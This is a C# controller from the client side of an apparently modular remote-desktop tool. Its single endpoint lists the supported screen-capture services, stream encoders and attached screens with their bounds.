using System.Collections.Generic;
using System.Linq;
using System.Windows.Forms;
using Orcus.Modules.Api;
using Orcus.Modules.Api.Parameters;
using Orcus.Modules.Api.Routing;
using RemoteDesktop.Client.Capture;
using RemoteDesktop.Client.Encoder;
using RemoteDesktop.Shared.Dtos;

namespace RemoteDesktop.Client.Controllers
{
    [Route("")]
    public class RemoteDesktopController : OrcusController
    {
        [OrcusGet("parameters")]
        public IActionResult GetParameters([FromServices] IEnumerable<IScreenCaptureService> captureServices,
            [FromServices] IEnumerable<IStreamEncoder> encoders)
        {
            var parameters = new ParametersDto
            {
                CaptureServices = captureServices.Where(x => x.IsPlatformSupported).Select(x => x.Id).ToArray(),
                Encoders = encoders.Where(x => x.IsPlatformSupported).Select(x => x.Id).ToArray(),
                Screens = Screen.AllScreens.Select(x => new ScreenDto {Bounds = x.Bounds, IsPrimary = x.Primary}).ToArray()
            };

            return Ok(parameters);
        }
    }
}